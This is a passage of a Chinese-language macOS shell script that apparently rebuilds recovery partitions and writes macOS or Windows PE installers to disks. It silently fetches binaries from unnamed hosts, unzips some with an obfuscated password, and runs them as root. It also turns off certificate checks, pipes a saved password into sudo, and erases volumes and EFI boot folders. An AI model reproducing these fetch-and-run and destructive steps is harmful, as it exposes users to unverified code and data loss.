		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c65.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
			

else
	if [ ! -f "/tmp/aria2c" ]; 
	then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2c.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2ccc.zip" -d "/tmp">/dev/null 2>&1
	fi
	fi
	fi
	fi
	fi
	
	
	if [ ! -f "/tmp/aria2c" ]; then
		curl -# -C - --connect-timeout 10 -o /tmp/aria2c.zip "$ip5/aria2ccc.zip">/dev/null 2>&1
		unzip -o "/tmp/aria2c.zip" -d "/tmp">/dev/null 2>&1
	fi
	

	rm -f "/tmp/aria2c.zip"
	
	fi


	if [ ! -f "/tmp/aria2c" ]; then
	clear && printf "\e[3J"
	echo
	echo
	read -t 2 -p "必要下载组件无法获取！！！" numcs
	if [ "$numcs" = "0" ]; then
	Customize
	fi
	HFSIP
	fi

	
chmod a+x /tmp/aria2c	

#/tmp/aria2c -c -s25 -x16 -m0 -o dmtest.zip --console-log-level=warn --summary-interval=888888888 $ip5/dmtest.zip -d /tmp>/dev/null 2>&1	
#unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/dmtest.zip" -d "/tmp">/dev/null 2>&1	



apfsfq=$(diskutil list | grep Apple_APFS)

if [ "$apfsfq" ]; then
if [[ $modelxh = "10.13"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o 13SIP.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/06/50/041-91758-A_M8T44LH2AW/b5r4og05fhbgatve4agwy4kgkzv07mdid9/BaseSystem.dmg -d ~/Downloads/JG_Download
fi
if [[ $modelxh = "10.14"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o 14SIP.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/17/32/061-26589-A_8GJTCGY9PC/25fhcu905eta7wau7aoafu8rvdm7k1j4el/BaseSystem.dmg -d ~/Downloads/JG_Download
fi
if [[ $modelxh = "10.15"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o 15SIP.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/61/24/001-57224/0o1xetys5n505gocjsil5qo0p4kg939elb/BaseSystem.dmg -d ~/Downloads/JG_Download
fi
if [[ $modelxh = "11."* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o hf11.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 $ip8/Os/hf11.dmg -d ~/Downloads/JG_Download
fi
if [[ $modelxh = "12."* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o hf12.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 $ip8/Os/hf12.dmg  -d ~/Downloads/JG_Download
fi
if [[ $modelxh = "13."* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o hf13.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 $ip8/Os/hf13.dmg -d ~/Downloads/JG_Download
fi
if [[ $modelxh = "14."* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o hf13.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 $ip8/Os/hf13.dmg -d ~/Downloads/JG_Download
fi
clear && printf "\e[3J"
echo "下载完成，APFS分区请手动创建"
exit 0
else
if [[ $modelxh = "10.12"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/06/50/041-91758-A_M8T44LH2AW/b5r4og05fhbgatve4agwy4kgkzv07mdid9/BaseSystem.dmg -d /tmp/ReHD
#/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.chunklist --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/06/50/041-91758-A_M8T44LH2AW/b5r4og05fhbgatve4agwy4kgkzv07mdid9/BaseSystem.chunklist -d /tmp/ReHD
fi
if [[ $modelxh = "10.13"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/06/50/041-91758-A_M8T44LH2AW/b5r4og05fhbgatve4agwy4kgkzv07mdid9/BaseSystem.dmg -d /tmp/ReHD
#/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.chunklist --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/06/50/041-91758-A_M8T44LH2AW/b5r4og05fhbgatve4agwy4kgkzv07mdid9/BaseSystem.chunklist -d /tmp/ReHD
fi
if [[ $modelxh = "10.14"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/17/32/061-26589-A_8GJTCGY9PC/25fhcu905eta7wau7aoafu8rvdm7k1j4el/BaseSystem.dmg -d /tmp/ReHD
#/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.chunklist --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/17/32/061-26589-A_8GJTCGY9PC/25fhcu905eta7wau7aoafu8rvdm7k1j4el/BaseSystem.chunklist -d /tmp/ReHD
fi
if [[ $modelxh = "10.15"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/61/24/001-57224/0o1xetys5n505gocjsil5qo0p4kg939elb/BaseSystem.dmg -d /tmp/ReHD
#/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.chunklist --check-certificate=false --console-log-level=warn --summary-interval=888888888 http://swcdn.apple.com/content/downloads/61/24/001-57224/0o1xetys5n505gocjsil5qo0p4kg939elb/BaseSystem.chunklist -d /tmp/ReHD
fi
if [[ $modelxh = "10.11"* ]]; then
/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.dmg --check-certificate=false --console-log-level=warn --summary-interval=888888888 $ip8/Os/hf10.11.dmg -d /tmp/ReHD
#/tmp/aria2c -c -s25 -x16 -m0 -o BaseSystem.chunklist --check-certificate=false --console-log-level=warn --summary-interval=888888888 $ip8/666/BaseSystem.chunklist -d /tmp/ReHD
fi
fi


	
	if [ -f /tmp/ReHD/*.aria2 ]; then
	read -t 10 -p "下载不完整，10秒后将自动重试下载..."
	HFSIP
	fi
	
	if [ ! -f /tmp/ReHD/BaseSystem.dmg ]; then
	read -t 10 -p "无法下载BaseSystem.dmg，10秒后将自动重试下载..."
	HFSIP
	else
	filesize="$(ls -l /tmp/ReHD/BaseSystem.dmg | awk '{ print $5 }')" 
	if [ "$filesize" -lt "1000000" ]; then
	clear && printf "\e[3J"
	echo
	rm -rf /tmp/ReHD/BaseSystem.dmg
	read -t 2 -p "下载BaseSystem有误，将自动重试下载...如果一直重复，请通知技术员"
	HFSIP
	fi
	fi
	
	#if [ ! -f /tmp/ReHD/BaseSystem.chunklist ]; then
	#read -t 10 -p "无法下载BaseSystem.chunklist，10秒后将自动重试下载..."
	#HFSIP	
	#fi







clear && printf "\e[3J"		
echo	
echo "重建Recovery HD中..."	
echo
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi
jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.13"* ]]; then
devboot="disk0s2"
fi
fi
fi

if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk0s2 |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi

size="2500000000"
new_hfs_size="$(($hfs_size-$size))b"

if [ "$jchxj" ] ; then
restore_device=`diskutil cs resizestack "$devboot" "${new_hfs_size}" JHFS+ MACHD 0b|grep 'MACHD'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
else
restore_device=`diskutil resizeVolume disk0s2 "${new_hfs_size}" JHFS+ MACHD 0b|grep 'MACHD'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
fi
echo "$pass" | sudo -S sudo asr restore -source /tmp/ReHD/BaseSystem.dmg -target /Volumes/MACHD -noprompt -noverify -erase
clear && printf "\e[3J"		
echo
echo "重建Recovery HD完成，请检查"
diskutil list
echo
read -s -n1 -p "任意键返回..."
ZLDQ


clear && printf "\e[3J"		
echo	
echo "重建Recovery HD中..."	
echo
echo "$pass" | sudo -S sudo /tmp/dmtest ensureRecoveryPartition / /tmp/ReHD/BaseSystem.dmg 0 0 /tmp/ReHD/BaseSystem.chunklist>/dev/null 2>&1

clear && printf "\e[3J"

echo "重建Recovery HD完成，请检查"

diskutil list


read -s -n1 -p "任意键返回..."
ZLDQ
}


BDMAC(){
clear && printf "\e[3J"
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi

jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi


apfs_active=`diskutil list | grep Apple_APFS`

if [ ! "$iMacbb" ] ; then
if [ "$apfs_active" ] ; then
if [[ $modelxh = "10.13"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "10.14"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "10.15"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
else
if [[ $modelxh = "10.13"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.14"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.15"* ]]; then
devboot="disk0s2"
fi
fi
fi
fi
fi

num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
if [ ! "$size" ]; then
size="15000000000"
fi
new_hfs_size="$(($hfs_size-$size))b"
apfs_active=0
is_apfs=`diskutil info disk"$num"s"$num2" | grep apfs`
if [ $? -eq 0 ] ; then
echo "硬盘格式为：APFS"
apfs_active=1
fi
core_storage_active=0
echo "检查核心存储....."
is_core_storage=`diskutil cs info disk"$num"s"$num2"`
if [ $? -eq 0 ] ; then
echo "所选卷是核心存储"
core_storage_active=1
fi
if [ $core_storage_active -eq 1 ]; then
echo "有核心存储，正在检查"
DISKFOUND=`diskutil cs list|grep 'CoreStorage logical volume groups'|sed "s|.*(\(.*\) found.*|\1|"`
if [ $DISKFOUND != "1" ]; then
echo "超过1个cs组，不支持，退出执行"
exit -1
fi
fi

if [ ! -e /Volumes/MACDOS ] ; then

if [ $core_storage_active == 1  ] ; then
echo "从核心存储创建中..."
is_core_storage=`diskutil cs info disk"$num"`
if [ $? -eq 1 ] ; then
echo "所选卷不为核心存储，将更改为卷壹继续"
num="1"
fi
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ MACDOS 0b|grep 'MACDOS'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ ! -e /Volumes/MACDOS ] ; then
read -s -n1 -p "分区失败，请手动检查！"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
Start_menu
fi
fi

if [ $apfs_active == 1 ] ; then
echo creating from APFS
apfs_wholedisk=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 ParentWholeDisk|tail -1|sed 's|.*<string>\(.*\)</string>.*|\1|'`
if [ -z "$apfs_wholedisk" ] ; then
echo "无法从disk"$num"s"$num2"中找到整个磁盘。“退出”"
exit -1
fi
echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil apfs resizeContainer "${apfs_wholedisk}" "${new_hfs_size}" JHFS+ MACDOS 0b|grep 'MACDOS'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ ! -e /Volumes/MACDOS ] ; then
read -s -n1 -p "分区失败，请手动检查！"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
Start_menu
fi
fi

if [ $apfs_active == 0 ] ; then
echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ MACDOS 0b|grep 'MACDOS'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ ! -e /Volumes/MACDOS ] ; then
read -s -n1 -p "分区失败，请手动检查！"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app
Start_menu
fi
fi

fi

hdiutil attach ~/Downloads/JG_Download/"$name"

if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
read -s -n1 -p "文件校验失败，可能下载不完整"
Start_menu
fi

clear && printf "\e[3J"
echo
echo "\033[36m正在写入系统进入本地硬盘中...\033[0m"
echo


echo "$pass" | sudo -S sudo asr restore -source ~/Downloads/JG_Download/"$name" -target /Volumes/MACDOS -noprompt -noverify -erase

clear
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo
echo "\033[36m本地重装Mac写入完成！！！\033[0m"
exit 0
}


UPMAC(){
clear && printf "\e[3J"

updisk="$(diskutil list | grep external | sed 's/[^0-9]//g')"

if [ ! "$updisk" ]; then
updisk="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | head -n 1)"
olddisk="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g')"
updisksl1="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '1,1p')"
updisksl2="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '2,1p')"
updisksl3="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '3,1p')"
updisksl4="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '4,1p')"
updisksl5="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '5,1p')"
updisksl6="$(system_profiler SPUSBDataType | grep 'BSD Name:' | sed 's/[^0-9]//g' | sed -n '6,1p')"
if [ "$updisksl1" ]; then
echo
if [ "$updisksl2" ]; then
echo
if [[ "$updisksl1" = "${updisksl2:0:1}" ]]; then
echo
if [ "$updisksl3" ]; then
echo
if [[ "$updisksl1" = "${updisksl3:0:1}" ]]; then
echo
if [ "$updisksl4" ]; then
echo
if [[ "$updisksl1" = "${updisksl4:0:1}" ]]; then
echo
if [ "$updisksl5" ]; then
echo
if [[ "$updisksl1" = "${updisksl5:0:1}" ]]; then
echo
if [ "$updisksl6" ]; then
echo
if [[ "$updisksl1" = "${updisksl6:0:1}" ]]; then
echo
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
else
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi
fi


fi


if [ "$updisk" ]; then
if [ $(echo "$updisk" | wc -l ) -gt 1 ]; then
echo
echo
read -s -n1 -p "检测到存在多个U盘，请拔出多余的U盘，请您按一下空格继续..."
UPPE
fi
fi

if [ ! "$updisk" ]; then
if [ ! "$olddisk" ]; then
echo
echo
read -s -n1 -p "检测不到U盘，请重新插上..."
UPPE
fi
fi


diskutil eraseDisk JHFS+ UPMAC disk"$updisk"

if [ ! -e /Volumes/UPMAC ]; then
killall "Disk Utility"
open /System/Applications/Utilities/Disk\ Utility.app 	
open /Applications/Utilities/Disk\ Utility.app 
clear && printf "\e[3J"
echo
echo
read -s -n1 -p "U盘未能格式化，请手动格式化后回车！"
UPMAC
fi

hdiutil attach ~/Downloads/JG_Download/"$name"

if [ $? -ne 0 ] ; then
clear && printf "\e[3J"
read -s -n1 -p "文件校验失败，可能下载不完整..."
Start_menu
fi

clear && printf "\e[3J"
echo
echo "\033[36m正在写入系统进入U盘中...\033[0m"
echo
echo "$pass" | sudo -S sudo asr restore -source ~/Downloads/JG_Download/"$name" -target /Volumes/UPMAC -noprompt -noverify -erase

if [ -e /Volumes/UPMAC ]; then
read -s -n1 -p "写入失败，可能是U盘无法格式化，任意键重试"
UPMAC
fi

clear
clear && printf "\e[3J"
echo
echo ID: "\033[36m${tbid}\033[0m"
echo
echo
echo "\033[36mMac系统-U盘制作完成！！！\033[0m"
exit 0
}


BDPE(){
clear && printf "\e[3J"
modelxh="$(sw_vers 2>/dev/null|awk '/ProductVersion:/ {print $NR}')"
macboot="$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4,$5,$6}')"
devboot="$(diskutil list | grep "$macboot" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1)"

if [[ $modelxh = "10.4"* ]]; then
winclone1111="1"
fi
if [[ $modelxh = "10.5"* ]]; then
winclone2222="1"
fi
if [[ $modelxh = "10.6"* ]]; then
winclone5="1"
fi
if [[ $modelxh = "10.7"* ]]; then
winclone5="1"
fi
if [[ $modelxh = "10.8"* ]]; then
winclone5="1"
fi
if [[ $modelxh = "10.9"* ]]; then
winclone5="1"
fi
if [ ! "$devboot" ]; then
devboot="$(diskutil list | grep "$(system_profiler SPSoftwareDataType 2>/dev/null|awk '/Boot Volume:/ {print $3,$4}')" | sed 's/.*\(disk.*[0123456789]*\).*/\1/g'| head -n 1 | tail -n 1)"
fi

jchxj="$(diskutil list | grep Apple_CoreStorage)"
if [ ! "$jchxj" ]; then
if [ ! "${devboot:6:1}" ]; then
devboot=""
if [[ $modelxh = "10.7"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.8"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.9"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.10"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.11"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.12"* ]]; then
devboot="disk0s2"
fi


apfs_active=`diskutil list | grep Apple_APFS`

if [ ! "$iMacbb" ] ; then
if [ "$apfs_active" ] ; then
if [[ $modelxh = "10.13"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "10.14"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "10.15"* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "11."* ]]; then
devboot="disk1s1"
fi
if [[ $modelxh = "12."* ]]; then
devboot="disk1s1"
fi
if [ "$zxos" ]; then
devboot="disk1s1"
fi
else
if [[ $modelxh = "10.13"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.14"* ]]; then
devboot="disk0s2"
fi
if [[ $modelxh = "10.15"* ]]; then
devboot="disk0s2"
fi
fi
fi
fi
fi

num="${devboot:4:1}"
num2="${devboot:6:1}"
if [ "$jchxj" ]; then
hfs_size=`diskutil info -plist "$devboot" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`	
else	
hfs_size=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 TotalSize|tail -1|sed 's|.*<integer>\(.*\)</integer>.*|\1|'`
fi
if [ ! "$size" ]; then
size="2000000000"
fi
new_hfs_size="$(($hfs_size-$size))b"
apfs_active=0
is_apfs=`diskutil info disk"$num"s"$num2" | grep apfs`
if [ $? -eq 0 ] ; then
echo $zdys"硬盘格式为：APFS"
apfs_active=1
fi
core_storage_active=0
echo $zdys"检查核心存储....."
is_core_storage=`diskutil cs info disk"$num"s"$num2"`
if [ $? -eq 0 ] ; then
echo $zdys"所选卷是核心存储"
core_storage_active=1
fi
if [ $core_storage_active -eq 1 ]; then
echo $zdys"有核心存储，正在检查"
DISKFOUND=`diskutil cs list|grep 'CoreStorage logical volume groups'|sed "s|.*(\(.*\) found.*|\1|"`
if [ $DISKFOUND != "1" ]; then
echo $zdys"超过1个cs组，不支持，退出执行"
exit -1
fi
fi

if [ ! "$ycmmaz" ]; then
win_partition=$(diskutil list | grep 'Microsoft Basic Data' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')
if [ "${win_partition}" ] ; then
echo "检测到存在Win系统分区"
restore_device="/dev/${win_partition}"
if [ $(echo "$restore_device" | wc -l ) -gt 1 ]; then
echo "检测到存在多个Win系统分区，请手动选择磁盘，按任意键继续 ... "
clear && printf "\e[3J"
echo "\033[36m选择需要写入的分区\033[0m"
echo 
diskutil list | grep 'Microsoft Basic Data'
echo 
read -p "输入系统总分区位置:" num
case "$num" in
	x)
	Start_menu
	;;
esac
if [ ! "$num" ]; then
BDPE
fi
echo
read -p "输入系统子分区位置:" num2
case "$num2" in
	x)
	Start_menu
	;;
esac
if [ ! "$num2" ]; then
BDPE
fi
restore_device="/dev/disk"$num"s"$num2""
pdfq=$(diskutil list | grep "disk"$num"s"$num2"" | grep 'Microsoft Basic Data')
if [ ! "$pdfq" ]; then
BDPE
fi
wzyp=$(diskutil list "disk"$num"s"$num2"" | grep 'external')
Downloadzxc
fi
diskutil eraseVolume MS-DOS PEDOS $restore_device
fi
fi

echo "$pass" | sudo -S sudo diskutil mount disk0s1
if [ $? -ne 0 ] ; then
echo "$pass" | sudo -S sudo mkdir /Volumes/EFI
echo "$pass" | sudo -S sudo mount -t msdos /dev/disk0s1 /Volumes/EFI
fi
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Boot
echo "$pass" | sudo -S sudo rm -rf /Volumes/EFI/EFI/Microsoft
echo "$pass" | sudo -S sudo diskutil unmount disk0s1

if [[ $modelxh = "10.4"* ]]; then

if [ ! "$restore_device" ]; then

restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" MS-DOS PEDOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`

if [ $? -ne 0 ] ; then
echo
echo
echo -e "分区失败，请通知技术员！"
exit
fi


echo
echo
echo -e "分区完成，需要重启电脑，请通知技术员！"
echo
echo
exit


fi

else


if [ -e /Volumes/DOS ] ; then
	
restore_device=$(diskutil list | grep 'DOS' | sed 's/.*\(disk.*[0123456789]*\).*/\1/g')	

diskutil eraseVolume MS-DOS PEDOS $restore_device

fi


if [ ! -e /Volumes/PEDOS ] ; then

if [ $core_storage_active -eq 1 ]; then
echo "有核心存储，正在检查"
DISKFOUND=`diskutil cs list|grep 'CoreStorage logical volume groups'|sed "s|.*(\(.*\) found.*|\1|"`
if [ $DISKFOUND != "1" ]; then
echo "超过1个cs组，不支持，退出执行"
exit -1
fi
fi

if [ $apfs_active == 1 ] ; then
echo creating from APFS
apfs_wholedisk=`diskutil info -plist disk"$num"s"$num2" |grep -A 1 ParentWholeDisk|tail -1|sed 's|.*<string>\(.*\)</string>.*|\1|'`
if [ -z "$apfs_wholedisk" ] ; then
echo "无法从disk"$num"s"$num2"中找到整个磁盘。“退出”"
exit -1
fi
echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil apfs resizeContainer "${apfs_wholedisk}" "${new_hfs_size}" MS-DOS PEDOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ ! -e /Volumes/PEDOS ] ; then
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
fi


if [ ! "$oldmm" ]; then
if [ ! "$winclone5" ]; then

if [ $core_storage_active == 1  ] ; then
echo "从核心存储创建中..."
is_core_storage=`diskutil cs info disk"$num"`
if [ $? -eq 1 ] ; then
echo "所选卷不为核心存储，将更改为卷壹继续"
num="1"
fi
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS PEDOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ ! -e /Volumes/PEDOS ] ; then
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
fi


if [ $apfs_active == 0 ] ; then
echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" JHFS+ Boot 100MB MS-DOS PEDOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
if [ ! -e /Volumes/PEDOS ] ; then
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
fi

else

if [ $core_storage_active == 1  ] ; then
echo "从核心存储创建中..."
is_core_storage=`diskutil cs info disk"$num"`
if [ $? -eq 1 ] ; then
echo "所选卷不为核心存储，将更改为卷壹继续"
num="1"
fi
restore_device=`diskutil cs resizestack disk"$num" "${new_hfs_size}" MS-DOS PEDOS 0b|grep 'FAT32 clusters'|sed 's/.*\(disk[0123456789]\{1,\}s[0123456789]\{1,\}\).*/\1/'`
if [ ! -e /Volumes/PEDOS ] ; then
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
fi

if [ $apfs_active == 0 ] ; then
echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" MS-DOS PEDOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
if [ ! -e /Volumes/PEDOS ] ; then
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi
fi


fi
else

echo 正在操作中....需要较长时间....耐心等待即可....
restore_device=`diskutil resizeVolume disk"$num"s"$num2" "${new_hfs_size}" MS-DOS PEDOS 0b|grep "Microsoft Basic Data"|sed 's/.*\(disk.*s.*\)/\1/'`
if [ ! -e /Volumes/PEDOS ] ; then
clear && printf "\e[3J"
osascript -e 'Tell application "System Events" to display dialog "分区失败，请通知技术员！" buttons {"OK"}'
echo
echo "分区失败，请通知技术员！"
exit
fi



fi


restore_device="/dev/${restore_device}"

fi






fi


if [ "$winclone1111" ]; then
curl -# -C - --connect-timeout 10 -o /tmp/pe.zip "$ip5/pe.zip">/dev/null 2>&1
curl -# -C - --connect-timeout 10 -o /tmp/wl1.zip "$ip5/wl1.zip">/dev/null 2>&1
unzip -o "/tmp/pe.zip" -d "/tmp">/dev/null 2>&1
unzip -o -P "${zxc:25:1}${zxc:31:1}${zxc:3:1}${cxz:2:1}${cxz:0:1}4${cxz:0:1}59${cxz:11:1}" "/tmp/wl1.zip" -d "/tmp">/dev/null 2>&1

